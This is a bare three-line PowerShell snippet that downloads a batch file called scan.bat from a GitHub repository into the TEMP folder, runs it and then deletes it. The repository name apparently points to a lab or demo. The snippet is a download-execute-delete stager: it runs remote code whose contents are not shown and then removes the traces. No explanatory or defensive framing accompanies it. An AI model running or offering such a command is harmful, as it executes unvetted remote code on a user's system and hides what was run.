Invoke-WebRequest "https://raw.githubusercontent.com/crjtpp/tpplab_public/main/sedemo01/scan.bat" -OutFile $env:TEMP\scan.bat
Start-Process -Wait $env:TEMP\scan.bat
Remove-Item $env:TEMP\scan.bat
